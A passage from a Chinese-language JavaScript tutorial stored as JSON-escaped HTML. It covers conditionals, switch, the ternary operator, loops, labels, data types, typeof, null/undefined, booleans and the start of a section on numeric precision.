&quot;2&quot;</code></pre><p>上面代码的原意是，当<code>x</code>等于<code>y</code>的时候，才执行相关语句。但是，不小心将严格相等运算符写成赋值表达式，结果变成了将<code>y</code>赋值给变量<code>x</code>，再判断变量<code>x</code>的值（等于2）的布尔值（结果为<code>true</code>）。</p>\n<p>这种错误可以正常生成一个布尔值，因而不会报错。为了避免这种情况，有些开发者习惯将常量写在运算符的左边，这样的话，一旦不小心将相等运算符写成赋值运算符，就会报错，因为常量不能被赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (x = 2) { // 不报错\nif (2 = x) { // 报错</code></pre><p>至于为什么优先采用“严格相等运算符”（<code>===</code>），而不是“相等运算符”（<code>==</code>），请参考《运算符》章节。</p>\n\n        <h3>\n            <a href='#if...else-结构' class='header-anchor'>#</a>\n            <span>if...else 结构</span>\n        </h3>\n    <p><code>if</code>代码块后面，还可以跟一个<code>else</code>代码块，表示不满足条件时，所要执行的代码。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (m === 3) {\n  // 满足条件时，执行的语句\n} else {\n  // 不满足条件时，执行的语句\n}</code></pre><p>上面代码判断变量<code>m</code>是否等于3，如果等于就执行<code>if</code>代码块，否则执行<code>else</code>代码块。</p>\n<p>对同一个变量进行多次判断时，多个<code>if...else</code>语句可以连写在一起。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (m === 0) {\n  // ...\n} else if (m === 1) {\n  // ...\n} else if (m === 2) {\n  // ...\n} else {\n  // ...\n}</code></pre><p><code>else</code>代码块总是与离自己最近的那个<code>if</code>语句配对。</p>\n<pre class=\"prettyprint language-javascript\"><code>var m = 1;\nvar n = 2;\n\nif (m !== 1)\nif (n === 2) console.log(&#039;hello&#039;);\nelse console.log(&#039;world&#039;);</code></pre><p>上面代码不会有任何输出，<code>else</code>代码块不会得到执行，因为它跟着的是最近的那个<code>if</code>语句，相当于下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (m !== 1) {\n  if (n === 2) {\n    console.log(&#039;hello&#039;);    \n  } else {\n    console.log(&#039;world&#039;);\n  }\n}</code></pre><p>如果想让<code>else</code>代码块跟随最上面的那个<code>if</code>语句，就要改变大括号的位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (m !== 1) {\n  if (n === 2) {\n    console.log(&#039;hello&#039;);    \n  }\n} else {\n  console.log(&#039;world&#039;);\n}\n// world</code></pre>\n        <h3>\n            <a href='#switch-结构' class='header-anchor'>#</a>\n            <span>switch 结构</span>\n        </h3>\n    <p>多个<code>if...else</code>连在一起使用的时候，可以转为使用更方便的<code>switch</code>结构。</p>\n<pre class=\"prettyprint language-javascript\"><code>switch (fruit) {\n  case &quot;banana&quot;:\n    // ...\n    break;\n  case &quot;apple&quot;:\n    // ...\n    break;\n  default:\n    // ...\n}</code></pre><p>上面代码根据变量<code>fruit</code>的值，选择执行相应的<code>case</code>。如果所有<code>case</code>都不符合，则执行最后的<code>default</code>部分。需要注意的是，每个<code>case</code>代码块内部的<code>break</code>语句不能少，否则会接下去执行下一个<code>case</code>代码块，而不是跳出<code>switch</code>结构。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\n\nswitch (x) {\n  case 1:\n    console.log(&#039;x 等于1&#039;);\n  case 2:\n    console.log(&#039;x 等于2&#039;);\n  default:\n    console.log(&#039;x 等于其他值&#039;);\n}\n// x等于1\n// x等于2\n// x等于其他值</code></pre><p>上面代码中，<code>case</code>代码块之中没有<code>break</code>语句，导致不会跳出<code>switch</code>结构，而会一直执行下去。正确的写法是像下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>switch (x) {\n  case 1:\n    console.log(&#039;x 等于1&#039;);\n    break;\n  case 2:\n    console.log(&#039;x 等于2&#039;);\n    break;\n  default:\n    console.log(&#039;x 等于其他值&#039;);\n}</code></pre><p><code>switch</code>语句部分和<code>case</code>语句部分，都可以使用表达式。</p>\n<pre class=\"prettyprint language-javascript\"><code>switch (1 + 3) {\n  case 2 + 2:\n    f();\n    break;\n  default:\n    neverHappens();\n}</code></pre><p>上面代码的<code>default</code>部分，是永远不会执行到的。</p>\n<p>需要注意的是，<code>switch</code>语句后面的表达式，与<code>case</code>语句后面的表示式比较运行结果时，采用的是严格相等运算符（<code>===</code>），而不是相等运算符（<code>==</code>），这意味着比较时不会发生类型转换。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\n\nswitch (x) {\n  case true:\n    console.log(&#039;x 发生类型转换&#039;);\n  default:\n    console.log(&#039;x 没有发生类型转换&#039;);\n}\n// x 没有发生类型转换</code></pre><p>上面代码中，由于变量<code>x</code>没有发生类型转换，所以不会执行<code>case true</code>的情况。这表明，<code>switch</code>语句内部采用的是“严格相等运算符”，详细解释请参考《运算符》一节。</p>\n\n        <h3>\n            <a href='#三元运算符-?:' class='header-anchor'>#</a>\n            <span>三元运算符 ?:</span>\n        </h3>\n    <p>JavaScript还有一个三元运算符（即该运算符需要三个运算子）<code>?:</code>，也可以用于逻辑判断。</p>\n<pre class=\"prettyprint language-javascript\"><code>(条件) ? 表达式1 : 表达式2</code></pre><p>上面代码中，如果“条件”为<code>true</code>，则返回“表达式1”的值，否则返回“表达式2”的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var even = (n % 2 === 0) ? true : false;</code></pre><p>上面代码中，如果<code>n</code>可以被2整除，则<code>even</code>等于<code>true</code>，否则等于<code>false</code>。它等同于下面的形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var even;\nif (n % 2 === 0) {\n  even = true;\n} else {\n  even = false;\n}</code></pre><p>这个三元运算符可以被视为<code>if...else...</code>的简写形式，因此可以用于多种场合。</p>\n<pre class=\"prettyprint language-javascript\"><code>var myVar;\nconsole.log(\n  myVar ?\n  &#039;myVar has a value&#039; :\n  &#039;myVar does not have a value&#039;\n)\n// myVar does not have a value</code></pre><p>上面代码利用三元运算符，输出相应的提示。</p>\n<pre class=\"prettyprint language-javascript\"><code>var msg = &#039;数字&#039; + n + &#039;是&#039; + (n % 2 === 0 ? &#039;偶数&#039; : &#039;奇数&#039;);</code></pre><p>上面代码利用三元运算符，在字符串之中插入不同的值。</p>\n\n        <h2>\n            <a href='#循环语句' class='header-anchor'>#</a>\n            <span>循环语句</span>\n        </h2>\n    <p>循环语句用于重复执行某个操作，它有多种形式。</p>\n\n        <h3>\n            <a href='#while-循环' class='header-anchor'>#</a>\n            <span>while 循环</span>\n        </h3>\n    <p><code>While</code>语句包括一个循环条件和一段代码块，只要条件为真，就不断循环执行代码块。</p>\n<pre class=\"prettyprint language-javascript\"><code>while (条件)\n  语句;\n\n// 或者\nwhile (条件) 语句;</code></pre><p><code>while</code>语句的循环条件是一个表达式，必须放在圆括号中。代码块部分，如果只有一条语句，可以省略大括号，否则就必须加上大括号。</p>\n<pre class=\"prettyprint language-javascript\"><code>while (条件) {\n  语句;\n}</code></pre><p>下面是<code>while</code>语句的一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var i = 0;\n\nwhile (i &lt; 100) {\n  console.log(&#039;i 当前为：&#039; + i);\n  i = i + 1;\n}</code></pre><p>上面的代码将循环100次，直到<code>i</code>等于100为止。</p>\n<p>下面的例子是一个无限循环，因为循环条件总是为真。</p>\n<pre class=\"prettyprint language-javascript\"><code>while (true) {\n  console.log(&#039;Hello, world&#039;);\n}</code></pre>\n        <h3>\n            <a href='#for-循环' class='header-anchor'>#</a>\n            <span>for 循环</span>\n        </h3>\n    <p><code>for</code>语句是循环命令的另一种形式，可以指定循环的起点、终点和终止条件。它的格式如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>for (初始化表达式; 条件; 递增表达式)\n  语句\n\n// 或者\n\nfor (初始化表达式; 条件; 递增表达式) {\n  语句\n}</code></pre><p><code>for</code>语句后面的括号里面，有三个表达式。</p>\n<ul>\n<li>初始化表达式（initialize）：确定循环变量的初始值，只在循环开始时执行一次。</li>\n<li>条件表达式（test）：每轮循环开始时，都要执行这个条件表达式，只有值为真，才继续进行循环。</li>\n<li>递增表达式（increment）：每轮循环的最后一个操作，通常用来递增循环变量。</li>\n</ul>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 3;\nfor (var i = 0; i &lt; x; i++) {\n  console.log(i);\n}\n// 0\n// 1\n// 2</code></pre><p>上面代码中，初始化表达式是<code>var i = 0</code>，即初始化一个变量<code>i</code>；测试表达式是<code>i &lt; x</code>，即只要<code>i</code>小于<code>x</code>，就会执行循环；递增表达式是<code>i++</code>，即每次循环结束后，<code>i</code>增大1。</p>\n<p>所有<code>for</code>循环，都可以改写成<code>while</code>循环。上面的例子改为<code>while</code>循环，代码如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 3;\nvar i = 0;\n\nwhile (i &lt; x) {\n  console.log(i);\n  i++;\n}</code></pre><p><code>for</code>语句的三个部分（initialize、test、increment），可以省略任何一个，也可以全部省略。</p>\n<pre class=\"prettyprint language-javascript\"><code>for ( ; ; ){\n  console.log(&#039;Hello World&#039;);\n}</code></pre><p>上面代码省略了<code>for</code>语句表达式的三个部分，结果就导致了一个无限循环。</p>\n\n        <h3>\n            <a href='#do...while-循环' class='header-anchor'>#</a>\n            <span>do...while 循环</span>\n        </h3>\n    <p><code>do...while</code>循环与<code>while</code>循环类似，唯一的区别就是先运行一次循环体，然后判断循环条件。</p>\n<pre class=\"prettyprint language-javascript\"><code>do\n  语句\nwhile (条件);\n\n// 或者\ndo {\n  语句\n} while (条件);</code></pre><p>不管条件是否为真，<code>do...while</code>循环至少运行一次，这是这种结构最大的特点。另外，<code>while</code>语句后面的分号注意不要省略。</p>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 3;\nvar i = 0;\n\ndo {\n  console.log(i);\n  i++;\n} while(i &lt; x);</code></pre>\n        <h3>\n            <a href='#break-语句和-continue-语句' class='header-anchor'>#</a>\n            <span>break 语句和 continue 语句</span>\n        </h3>\n    <p><code>break</code>语句和<code>continue</code>语句都具有跳转作用，可以让代码不按既有的顺序执行。</p>\n<p><code>break</code>语句用于跳出代码块或循环。</p>\n<pre class=\"prettyprint language-javascript\"><code>var i = 0;\n\nwhile(i &lt; 100) {\n  console.log(&#039;i 当前为：&#039; + i);\n  i++;\n  if (i === 10) break;\n}</code></pre><p>上面代码只会执行10次循环，一旦<code>i</code>等于10，就会跳出循环。</p>\n<p><code>for</code>循环也可以使用<code>break</code>语句跳出循环。</p>\n<pre class=\"prettyprint language-javascript\"><code>for (var i = 0; i &lt; 5; i++) {\n  console.log(i);\n  if (i === 3)\n    break;\n}\n// 0\n// 1\n// 2\n// 3</code></pre><p>上面代码执行到<code>i</code>等于3，就会跳出循环。</p>\n<p><code>continue</code>语句用于立即终止本轮循环，返回循环结构的头部，开始下一轮循环。</p>\n<pre class=\"prettyprint language-javascript\"><code>var i = 0;\n\nwhile (i &lt; 100){\n  i++;\n  if (i % 2 === 0) continue;\n  console.log(&#039;i 当前为：&#039; + i);\n}</code></pre><p>上面代码只有在<code>i</code>为奇数时，才会输出<code>i</code>的值。如果<code>i</code>为偶数，则直接进入下一轮循环。</p>\n<p>如果存在多重循环，不带参数的<code>break</code>语句和<code>continue</code>语句都只针对最内层循环。</p>\n\n        <h3>\n            <a href='#标签（label）' class='header-anchor'>#</a>\n            <span>标签（label）</span>\n        </h3>\n    <p>JavaScript 语言允许，语句的前面有标签（label），相当于定位符，用于跳转到程序的任意位置，标签的格式如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>label:\n  语句</code></pre><p>标签可以是任意的标识符，但不能是保留字，语句部分可以是任意语句。</p>\n<p>标签通常与<code>break</code>语句和<code>continue</code>语句配合使用，跳出特定的循环。</p>\n<pre class=\"prettyprint language-javascript\"><code>top:\n  for (var i = 0; i &lt; 3; i++){\n    for (var j = 0; j &lt; 3; j++){\n      if (i === 1 &amp;&amp; j === 1) break top;\n      console.log(&#039;i=&#039; + i + &#039;, j=&#039; + j);\n    }\n  }\n// i=0, j=0\n// i=0, j=1\n// i=0, j=2\n// i=1, j=0</code></pre><p>上面代码为一个双重循环区块，<code>break</code>命令后面加上了<code>top</code>标签（注意，<code>top</code>不用加引号），满足条件时，直接跳出双层循环。如果<code>break</code>语句后面不使用标签，则只能跳出内层循环，进入下一次的外层循环。</p>\n<p>标签也可以用于跳出代码块。</p>\n<pre class=\"prettyprint language-javascript\"><code>foo: {\n  console.log(1);\n  break foo;\n  console.log(&#039;本行不会输出&#039;);\n}\nconsole.log(2);\n// 1\n// 2</code></pre><p>上面代码执行到<code>break foo</code>，就会跳出区块。</p>\n<p><code>continue</code>语句也可以与标签配合使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>top:\n  for (var i = 0; i &lt; 3; i++){\n    for (var j = 0; j &lt; 3; j++){\n      if (i === 1 &amp;&amp; j === 1) continue top;\n      console.log(&#039;i=&#039; + i + &#039;, j=&#039; + j);\n    }\n  }\n// i=0, j=0\n// i=0, j=1\n// i=0, j=2\n// i=1, j=0\n// i=2, j=0\n// i=2, j=1\n// i=2, j=2</code></pre><p>上面代码中，<code>continue</code>命令后面有一个标签名，满足条件时，会跳过当前循环，直接进入下一轮外层循环。如果<code>continue</code>语句后面不使用标签，则只能进入下一轮的内层循环。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2011/10/javascript-overview.html\">A quick overview of JavaScript</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"概述","link":"/types/general.html"}],"content":"\n        <h1>\n            <a href='#数据类型概述' class='header-anchor'>#</a>\n            <span>数据类型概述</span>\n        </h1>\n    \n        <h2>\n            <a href='#简介' class='header-anchor'>#</a>\n            <span>简介</span>\n        </h2>\n    <p>JavaScript 语言的每一个值，都属于某一种数据类型。JavaScript 的数据类型，共有六种。（ES6 又新增了第七种 Symbol 类型的值，本教程不涉及。）</p>\n<ul>\n<li>数值（number）：整数和小数（比如<code>1</code>和<code>3.14</code>）</li>\n<li>字符串（string）：文本（比如<code>Hello World</code>）。</li>\n<li>布尔值（boolean）：表示真伪的两个特殊值，即<code>true</code>（真）和<code>false</code>（假）</li>\n<li><code>undefined</code>：表示“未定义”或不存在，即由于目前没有定义，所以此处暂时没有任何值</li>\n<li><code>null</code>：表示空值，即此处的值为空。</li>\n<li>对象（object）：各种值组成的集合。</li>\n</ul>\n<p>通常，数值、字符串、布尔值这三种类型，合称为原始类型（primitive type）的值，即它们是最基本的数据类型，不能再细分了。对象则称为合成类型（complex type）的值，因为一个对象往往是多个原始类型的值的合成，可以看作是一个存放各种值的容器。至于<code>undefined</code>和<code>null</code>，一般将它们看成两个特殊值。</p>\n<p>对象是最复杂的数据类型，又可以分成三个子类型。</p>\n<ul>\n<li>狭义的对象（object）</li>\n<li>数组（array）</li>\n<li>函数（function）</li>\n</ul>\n<p>狭义的对象和数组是两种不同的数据组合方式，除非特别声明，本教程的”对象“都特指狭义的对象。函数其实是处理数据的方法，JavaScript 把它当成一种数据类型，可以赋值给变量，这为编程带来了很大的灵活性，也为 JavaScript 的“函数式编程”奠定了基础。</p>\n\n        <h2>\n            <a href='#typeof-运算符' class='header-anchor'>#</a>\n            <span>typeof 运算符</span>\n        </h2>\n    <p>JavaScript 有三种方法，可以确定一个值到底是什么类型。</p>\n<ul>\n<li><code>typeof</code>运算符</li>\n<li><code>instanceof</code>运算符</li>\n<li><code>Object.prototype.toString</code>方法</li>\n</ul>\n<p><code>instanceof</code>运算符和<code>Object.prototype.toString</code>方法，将在后文介绍。这里介绍<code>typeof</code>运算符。</p>\n<p><code>typeof</code>运算符可以返回一个值的数据类型。</p>\n<p>数值、字符串、布尔值分别返回<code>number</code>、<code>string</code>、<code>boolean</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof 123 // &quot;number&quot;\ntypeof &#039;123&#039; // &quot;string&quot;\ntypeof false // &quot;boolean&quot;</code></pre><p>函数返回<code>function</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {}\ntypeof f\n// &quot;function&quot;</code></pre><p><code>undefined</code>返回<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof undefined\n// &quot;undefined&quot;</code></pre><p>利用这一点，<code>typeof</code>可以用来检查一个没有声明的变量，而不报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>v\n// ReferenceError: v is not defined\n\ntypeof v\n// &quot;undefined&quot;</code></pre><p>上面代码中，变量<code>v</code>没有用<code>var</code>命令声明，直接使用就会报错。但是，放在<code>typeof</code>后面，就不报错了，而是返回<code>undefined</code>。</p>\n<p>实际编程中，这个特点通常用在判断语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 错误的写法\nif (v) {\n  // ...\n}\n// ReferenceError: v is not defined\n\n// 正确的写法\nif (typeof v === &quot;undefined&quot;) {\n  // ...\n}</code></pre><p>对象返回<code>object</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof window // &quot;object&quot;\ntypeof {} // &quot;object&quot;\ntypeof [] // &quot;object&quot;</code></pre><p>上面代码中，空数组（<code>[]</code>）的类型也是<code>object</code>，这表示在 JavaScript 内部，数组本质上只是一种特殊的对象。这里顺便提一下，<code>instanceof</code>运算符可以区分数组和对象。<code>instanceof</code>运算符的详细解释，请见《面向对象编程》一章。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o = {};\nvar a = [];\n\no instanceof Array // false\na instanceof Array // true</code></pre><p><code>null</code>返回<code>object</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof null // &quot;object&quot;</code></pre><p><code>null</code>的类型是<code>object</code>，这是由于历史原因造成的。1995年的 JavaScript 语言第一版，只设计了五种数据类型（对象、整数、浮点数、字符串和布尔值），没考虑<code>null</code>，只把它当作<code>object</code>的一种特殊值。后来<code>null</code>独立出来，作为一种单独的数据类型，为了兼容以前的代码，<code>typeof null</code>返回<code>object</code>就没法改变了。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2011/11/improving-typeof.html\">Improving the JavaScript typeof operator</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"null，undefined和布尔值","link":"/types/null-undefined-boolean.html"}],"content":"\n        <h1>\n            <a href='#null,-undefined-和布尔值' class='header-anchor'>#</a>\n            <span>null, undefined 和布尔值</span>\n        </h1>\n    \n        <h2>\n            <a href='#null-和-undefined' class='header-anchor'>#</a>\n            <span>null 和 undefined</span>\n        </h2>\n    \n        <h3>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h3>\n    <p><code>null</code>与<code>undefined</code>都可以表示“没有”，含义非常相似。将一个变量赋值为<code>undefined</code>或<code>null</code>，老实说，语法效果几乎没区别。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = undefined;\n// 或者\nvar a = null;</code></pre><p>上面代码中，变量<code>a</code>分别被赋值为<code>undefined</code>和<code>null</code>，这两种写法的效果几乎等价。</p>\n<p>在<code>if</code>语句中，它们都会被自动转为<code>false</code>，相等运算符（<code>==</code>）甚至直接报告两者相等。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (!undefined) {\n  console.log(&#039;undefined is false&#039;);\n}\n// undefined is false\n\nif (!null) {\n  console.log(&#039;null is false&#039;);\n}\n// null is false\n\nundefined == null\n// true</code></pre><p>从上面代码可见，两者的行为是何等相似！谷歌公司开发的 JavaScript 语言的替代品 Dart 语言，就明确规定只有<code>null</code>，没有<code>undefined</code>！</p>\n<p>既然含义与用法都差不多，为什么要同时设置两个这样的值，这不是无端增加复杂度，令初学者困扰吗？这与历史原因有关。</p>\n<p>1995年 JavaScript 诞生时，最初像 Java 一样，只设置了<code>null</code>表示&quot;无&quot;。根据 C 语言的传统，<code>null</code>可以自动转为<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number(null) // 0\n5 + null // 5</code></pre><p>上面代码中，<code>null</code>转为数字时，自动变成0。</p>\n<p>但是，JavaScript 的设计者 Brendan Eich，觉得这样做还不够。首先，第一版的 JavaScript 里面，<code>null</code>就像在 Java 里一样，被当成一个对象，Brendan Eich 觉得表示“无”的值最好不是对象。其次，那时的 JavaScript 不包括错误处理机制，Brendan Eich 觉得，如果<code>null</code>自动转为0，很不容易发现错误。</p>\n<p>因此，他又设计了一个<code>undefined</code>。区别是这样的：<code>null</code>是一个表示“空”的对象，转为数值时为<code>0</code>；<code>undefined</code>是一个表示&quot;此处无定义&quot;的原始值，转为数值时为<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number(undefined) // NaN\n5 + undefined // NaN</code></pre>\n        <h3>\n            <a href='#用法和含义' class='header-anchor'>#</a>\n            <span>用法和含义</span>\n        </h3>\n    <p>对于<code>null</code>和<code>undefined</code>，大致可以像下面这样理解。</p>\n<p><code>null</code>表示空值，即该处的值现在为空。调用函数时，某个参数未设置任何值，这时就可以传入<code>null</code>，表示该参数为空。比如，某个函数接受引擎抛出的错误作为参数，如果运行过程中未出错，那么这个参数就会传入<code>null</code>，表示未发生错误。</p>\n<p><code>undefined</code>表示“未定义”，下面是返回<code>undefined</code>的典型场景。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 变量声明了，但没有赋值\nvar i;\ni // undefined\n\n// 调用函数时，应该提供的参数没有提供，该参数等于 undefined\nfunction f(x) {\n  return x;\n}\nf() // undefined\n\n// 对象没有赋值的属性\nvar  o = new Object();\no.p // undefined\n\n// 函数没有返回值时，默认返回 undefined\nfunction f() {}\nf() // undefined</code></pre>\n        <h2>\n            <a href='#布尔值' class='header-anchor'>#</a>\n            <span>布尔值</span>\n        </h2>\n    <p>布尔值代表“真”和“假”两个状态。“真”用关键字<code>true</code>表示，“假”用关键字<code>false</code>表示。布尔值只有这两个值。</p>\n<p>下列运算符会返回布尔值：</p>\n<ul>\n<li>两元逻辑运算符： <code>&amp;&amp;</code> (And)，<code>||</code> (Or)</li>\n<li>前置逻辑运算符： <code>!</code> (Not)</li>\n<li>相等运算符：<code>===</code>，<code>!==</code>，<code>==</code>，<code>!=</code></li>\n<li>比较运算符：<code>&gt;</code>，<code>&gt;=</code>，<code>&lt;</code>，<code>&lt;=</code></li>\n</ul>\n<p>如果 JavaScript 预期某个位置应该是布尔值，会将该位置上现有的值自动转为布尔值。转换规则是除了下面六个值被转为<code>false</code>，其他值都视为<code>true</code>。</p>\n<ul>\n<li><code>undefined</code></li>\n<li><code>null</code></li>\n<li><code>false</code></li>\n<li><code>0</code></li>\n<li><code>NaN</code></li>\n<li><code>&quot;&quot;</code>或<code>&#39;&#39;</code>（空字符串）</li>\n</ul>\n<p>布尔值往往用于程序流程的控制，请看一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (&#039;&#039;) {\n  console.log(&#039;true&#039;);\n}\n// 没有任何输出</code></pre><p>上面代码中，<code>if</code>命令后面的判断条件，预期应该是一个布尔值，所以 JavaScript 自动将空字符串，转为布尔值<code>false</code>，导致程序不会进入代码块，所以没有任何输出。</p>\n<p>注意，空数组（<code>[]</code>）和空对象（<code>{}</code>）对应的布尔值，都是<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>if ([]) {\n  console.log(&#039;true&#039;);\n}\n// true\n\nif ({}) {\n  console.log(&#039;true&#039;);\n}\n// true</code></pre><p>更多关于数据类型转换的介绍，参见《数据类型转换》一章。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/01/categorizing-values.html\">Categorizing values in JavaScript</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"数值","link":"/types/number.html"}],"content":"\n        <h1>\n            <a href='#数值' class='header-anchor'>#</a>\n            <span>数值</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    \n        <h3>\n            <a href='#整数和浮点数' class='header-anchor'>#</a>\n            <span>整数和浮点数</span>\n        </h3>\n    <p>JavaScript 内部，所有数字都是以64位浮点数形式储存，即使整数也是如此。所以，<code>1</code>与<code>1.0</code>是相同的，是同一个数。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 === 1.0 // true</code></pre><p>这就是说，JavaScript 语言的底层根本没有整数，所有数字都是小数（64位浮点数）。容易造成混淆的是，某些运算只有整数才能完成，此时 JavaScript 会自动把64位浮点数，转成32位整数，然后再进行运算，参见《运算符》一章的”位运算“部分。</p>\n<p>由于浮点数不是精确的值，所以涉及小数的比较和运算要特别小心。</p>\n<pre class=\"prettyprint language-javascript\"><code>0.1 + 0.2 === 0.3\n// false\n\n0.3 / 0.1\n// 2.9999999999999996\n\n(0.3 - 0.2) === (0.2 - 0.1)\n// false</code></pre>\n        <h3>\n            <a href='#数值精度' class='header-anchor'>#</a>\n            <span>数值精度</span>\n        </h3>\n    <p>根据国际标准 IEEE 754，JavaScript 浮点数的64个二进制位，从最左边开始，是这样组成的。</p>\n<ul>\n<li>第1位：符号位，<code>0</code>表示正数，<code>1</code>表示负数</li>\n<li>第2位到第12位（共11位）：指数部分</li>\n<li>第13位到第64位（共52位）：小数部分（即有效数字）</li>\n</ul>\n<p>符号位决定了一个数的正负，指数部分决定了数值的大小，小数部分决定了数值的精度。</p>\n<p>指数部分一共有11个二进制位，因此大小范围就是0到2047。IEEE 754 规定，如果指数部分的值在0到2047之间（不含两个端点），那么有效数字的第一位默认总是1，不保存在64位浮点数之中。也就是说，有效数字这时总是<code>1.xx...xx</code>的形式，其中<code>xx..xx</code>的部分保存在64位浮点数之中，最长可能为52位。因此，JavaScript 提供的有效数字最长为53个二进制位。</p>\n<pre class=\"prettyprint\"><code>(-1)^符号位 * 1.xx...xx * 2^指数部分</code></pre><p>上面公式是正常情况下（指数部分在0到2047之间），一个数在 JavaScript 内部实际的表示形式。</p>\n<p>精度最多只能到53个二进制位，这意味着，绝对值小于等于2的53次方的整数，即-2<sup>53</sup>到2<sup>53</sup>，都可以精确表示。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.pow(2, 53)\n// 9007199254740992\n\nMath.pow(2, 53) + 1\n// 9007199254740992\n\nMath.pow(2, 53) + 2\n// 9007199254740994\n\nMath.pow(2, 53) + 3\n// 9007199254740996\n\nMath.pow(2, 53) + 4\n// 9007199254740996</code></pre><p>上面代码中，大于2的53次方以后，整数运算的结果开始出现错误。所以，大于2的53次方的数值，都无法保持精度。由于2的53次方是一个16位的十进制数值，所以简单的法则就是，JavaScript 对15位的十进制数都可以精确处理。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.pow(2, 53)\n// 9007199254740992\n\n// 多出的三个有效数字，将无法保存\n9007199254740992111\n// 9007199254740992000</code></pre><p>上面示例表明，大于2的53次方以后，多出来的有效数字（最后三位的<code>111</code>）都会无法保存，变成0。</p>\n\n        <h3>\n            <a href='#数值范围' class='header-anchor'>#</a>\n            <span>数值范围</span>\n        </h3>\n    <p>根据标准，64位浮点数的指数部分的长度是11个二进制位，意味着指数部分的最大值是2047（2的11次方减1）。也就是说，64位浮点数的指数部分的值最大为2047，分出一半表示负数，则 JavaScript 能够表示的数值范围为2<sup>1024</sup>到2<sup>-1023</sup>（开区间），超出这个范围的数无法表示。</p>\n<p>如果一个数大于等于2的1024次方，那么就会发生“正向溢出”，即 JavaScript 无法表示这么大的数，这时就会返回<code>Infinity</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.pow(2, 1024) // Infinity</code></pre><p>如果一个数小于等于2的-1075次方（指数部分最小值-1023，再加上小数部分的52位），那么就会发生为“负向溢出”，即 JavaScript 无法表示这么小的数，这时会直接返回0。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.pow(2, -1075) // 0</code></pre><p>下面是一个实际的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 0.5;\n\nfor(var i = 0; i &lt; 25; i++) {\n  x = x * x;\n}\n\nx // 0</code></pre><p>上面代码中，对<code>0.5</code>连续做25次平方，由于最后结果太接近0，超出了可表示的范围，JavaScript 就直接将其转为0。</p>\n<p>JavaScript 提供<code>Number</code>对象的<code>MAX_VALUE</code>和<code>MIN_VALUE</code>属性，返回可以表示的具体的最大值和最小值。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number.MAX_VALUE // 1.7976931348623157e+308\nNumber.MIN_VALUE // 5e-324</code></pre>\n        <h2>\n            <a href='#数值的表示法' class='header-anchor'>#</a>\n            <span>数值的表示法</span>\n        </h2>\n    <p>JavaScript 的数值有多种表示方法，可以用字面形式直接表示，比如<code>35</code>（十进制）和<code>0xFF</code>（十六进制）。</p>\n<p>数值也可以采用科学计数法表示，下面是几个科学计数法的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>123e3 // 123000\n123e-3 // 0.123\n-3.1E+12\n.1e-23</code></pre><p>科学计数法允许字母<code>e</code>或<code>E</code>的后面，跟着一个整数，表示这个数值的指数部分。</p>\n<p>以下两种情况，JavaScript 会自动将数值转为科学计数法表示，其他情况都采用字面形式直接表示。</p>\n<p><strong>（1）小数点前的数字多于21位。</strong></p>\n<pre class=\"prettyprint language-javascript\"><code>1234567890123456789012\n// 1.2345678901234568e+21\n\n123456789012345678901\n// 123456789012345680000</code></pre><p><strong>（2）小数点后的零多于5个。</strong></p>\n<pre class=\"prettyprint 